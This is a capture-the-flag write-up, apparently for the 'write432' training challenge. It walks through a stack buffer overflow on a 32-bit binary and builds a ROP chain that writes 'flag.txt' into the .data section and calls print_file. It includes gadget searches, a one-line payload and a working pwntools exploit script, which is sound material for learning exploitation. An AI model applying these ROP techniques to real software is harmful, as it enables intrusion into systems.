# Basic Test:

## Check call system into binary file
```bash
strace ./write432
```

## Check protection into binary file
```bash
checksec ./write432
```

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'

<br>

# Exploitation:

## Clear the kernel ring buffer
```bash
sudo dmesg -C
```

## Find offset for overwrite RIP
```bash
python2 -c 'print "A"*44 + "B"*4*' | ./write432
```

## See output
```bash
sudo dmesg -T
```

	[dim. avril  9 17:36:41 2023] write432[221900]: segfault at 42424242 ip 0000000042424242 sp 00000000ffb57d30 error 14 in libc.so.6[f7c00000+22000] likely on CPU 0 (core 0, socket 0)

## Find the a gadget for two parameters for moving into a section writable

```bash
ROPgadget --binary ./write432 | grep "pop edi ; pop ebp"
```
 
	0x080485aa : pop edi ; pop ebp ; ret

## Find a section writable
```bash
readelf -S ./write432
```

	    [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4

## Find a gadget for moving the file name into .data
```bash
ROPgadget --binary ./write432 | grep "mov dword"
```

	0x08048543 : mov dword ptr [edi], ebp ; ret

## Find a gadget for one parameter
```bash
ROPgadget --binary ./write432 | grep "pop ebp"
```

	0x080485ab : pop ebp ; ret

## Find the address of the print_file function
```bash
pwngdb> disass*usefulFunction
```

	   0x0804852a <+0>:     push   ebp
	   0x0804852b <+1>:     mov    ebp,esp
	   0x0804852d <+3>:     sub    esp,0x8
	   0x08048530 <+6>:     sub    esp,0xc
	   0x08048533 <+9>:     push   0x80485d0
	   0x08048538 <+14>:    call   0x80483d0 <print_file@plt>
	   0x0804853d <+19>:    add    esp,0x10
	   0x08048540 <+22>:    nop
	   0x08048541 <+23>:    leave
	   0x08048542 <+24>:    ret

## Convert Big Endian in Little Endian with python2
```python
>>> from pwn import *
>>> p32(0x080485aa)
'\xaa\x85\x04\x08'
>>> p32(0x0804a018)
'\x18\xa0\x04\x08'
>>> p32(0x08048543)
'C\x85\x04\x08'
>>> p32(0x080485aa)
'\xaa\x85\x04\x08'
>>> p32(0x0804a018+4)
'\x1c\xa0\x04\x08'
>>> p32(0x080485ab)
'\xab\x85\x04\x08'
>>> p32(0x80483d0)
'\xd0\x83\x04\x08'
```

## Payload final CLI

```bash
python2 -c 'print "A"*44 + "\xaa\x85\x04\x08" + "\x18\xa0\x04\x08" + "flag" + "C\x85\x04\x08" + "\xaa\x85\x04\x08" + "\x1c\xa0\x04\x08" + ".txt" + "C\x85\x04\x08" + "\xd0\x83\x04\x08" + "\xab\x85\x04\x08" + "\x18\xa0\x04\x08"' | ./write432 # pop edi ; pop ebp = 0x080485aa + .data = 0x0804a018 + string1 = flag + mov dword PTR [edi], ebp = 0x08048543 + pop ebp = 0x080485aa + .data+4 = 0x0804a018+4 + string2 = .txt + mov dword PTR [edi], ebp = 0x08048543 + call print_file = 0x80483d0 + pop ebp = 0x080485ab + .data = 0x0804a018
```

## Python2 pwntools script
```python
#usr/bin/python2
from pwn import *
elf = ELF("./write432")

padding = "A"*44
pop_edi_pop_ebp = p32(0x080485aa)
section_data = p32(0x0804a018)
section_data_4 = p32(0x0804a018+4)
string1 = "flag"
string2 = ".txt"
mov_dword_edi_ebp = p32(0x08048543)
pop_ebp = p32(0x080485ab)
call_print_file = p32(0x80483d0)

payload = padding + pop_edi_pop_ebp + section_data + string1 + mov_dword_edi_ebp
payload += pop_edi_pop_ebp + section_data_4 + string2 + mov_dword_edi_ebp
payload += call_print_file + pop_ebp + section_data

  

print(payload)
io = process(elf.path)
io.sendlineafter(">", payload)
print(io.recvall())

"""
io = process(elf.path)
io.sendline(payload)
io.interactive()
"""
```